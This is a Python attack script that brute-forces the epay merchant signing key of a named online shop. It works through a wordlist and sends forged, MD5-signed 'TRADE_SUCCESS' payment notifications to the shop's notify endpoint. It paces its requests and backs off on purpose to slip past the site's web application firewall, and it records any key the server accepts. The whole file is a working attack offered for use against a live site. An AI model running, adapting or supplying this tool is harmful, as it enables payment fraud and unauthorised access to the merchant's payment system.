#!/usr/bin/env python3
"""fffzz.lol epay merchant key brute — slow rate to avoid WAF slider."""
import hashlib
import json
import subprocess
import sys
import time
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import urlencode

BASE = "https://fffzz.lol/shop/"
OUT = Path(sys.argv[3]) if len(sys.argv) > 3 else Path("/workspace/results/fffzz.lol/kami_allin_20260717")
OUT.mkdir(parents=True, exist_ok=True)
JAR = str(OUT / ".cookies_epay")
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
HITS = OUT / "KAMI_HIT.jsonl"
PROGRESS = OUT / "epay_progress.json"
LOG = open(OUT / "epay_slow.log", "a", buffering=1)
DELAY = float(sys.argv[4]) if len(sys.argv) > 4 else 1.5


def log(msg):
    line = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
    print(line, flush=True)
    LOG.write(line + "\n")


def is_waf(body):
    return body and "_guard/html.js" in body


def epay_sign(params, key):
    items = sorted((k, v) for k, v in params.items() if k not in ("sign", "sign_type") and v != "")
    s = "&".join(f"{k}={v}" for k, v in items) + key
    return hashlib.md5(s.encode()).hexdigest()


def curl_post(url, post):
    cmd = [
        "curl", "-sk", "--max-time", "15", "-b", JAR, "-c", JAR, "-A", UA,
        "-H", f"Referer: {BASE}", "-H", "Content-Type: application/x-www-form-urlencoded",
        "-X", "POST", "-d", post, url,
    ]
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=18).stdout or ""
    except Exception:
        return ""


def site_up():
    cmd = ["curl", "-sk", "--max-time", "10", "-A", UA, f"{BASE}ajax.php?act=getcount"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=12).stdout or ""
        return bool(r.strip()) and "_guard" not in r
    except Exception:
        return False


def load_progress():
    if PROGRESS.exists():
        try:
            return json.loads(PROGRESS.read_text())
        except Exception:
            pass
    return {"line": 0}


def save_progress(line):
    PROGRESS.write_text(json.dumps({"line": line, "ts": datetime.now().isoformat()}))


def trade_nos():
    now = datetime.now()
    out = []
    for h in range(72):
        t = now - timedelta(hours=h)
        out.append(t.strftime("%Y%m%d%H%M%S") + "001")
        out.append(t.strftime("%Y%m%d%H%M") + "001")
    return list(dict.fromkeys(out))[:10]


def main():
    wl = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/workspace/wordlists/epay-sample.txt")
    max_keys = int(sys.argv[2]) if len(sys.argv) > 2 else 0
    prog = load_progress()
    start_line = prog.get("line", 0)
    log(f"epay slow start wl={wl} delay={DELAY}s from_line={start_line}")

    params = {
        "pid": "1000",
        "trade_no": "20260717000001",
        "out_trade_no": "20260717000001",
        "type": "alipay",
        "name": "test",
        "money": "75.00",
        "trade_status": "TRADE_SUCCESS",
    }

    tested = 0
    with wl.open(encoding="utf-8", errors="ignore") as f:
        for i, line in enumerate(f):
            if i < start_line:
                continue
            if max_keys and tested >= max_keys:
                break
            if not site_up():
                log("site down, sleep 30s")
                save_progress(i)
                time.sleep(30)
                continue

            k = line.strip()
            if not (4 <= len(k) <= 64):
                continue
            for tn in trade_nos()[:3]:
                p = dict(params)
                p["trade_no"] = tn
                p["out_trade_no"] = tn
                sign = epay_sign(p, k)
                post = urlencode({**p, "sign": sign, "sign_type": "MD5"})
                body = curl_post(f"{BASE}other/epay_notify.php", post)
                if is_waf(body):
                    log(f"WAF hit at line={i}, backoff 60s")
                    save_progress(i)
                    time.sleep(60)
                    break
                if body and body not in ("error", "fail", "") and any(x in body.lower() for x in ("success", "ok", "成功")):
                    with HITS.open("a") as hf:
                        hf.write(json.dumps({"kind": "epay_key", "key": k, "trade_no": tn, "resp": body[:300]}, ensure_ascii=False) + "\n")
                    log(f"*** EPAY KEY {k} resp={body[:100]}")
                    (OUT / "EPAY_KEY_FOUND.txt").write_text(f"{k}\n{body}")
                    return
            tested += 1
            if tested % 200 == 0:
                save_progress(i)
                log(f"progress line={i} tested={tested}")
            time.sleep(DELAY)

    save_progress(start_line + tested)
    log(f"epay done tested={tested}")


if __name__ == "__main__":
    main()
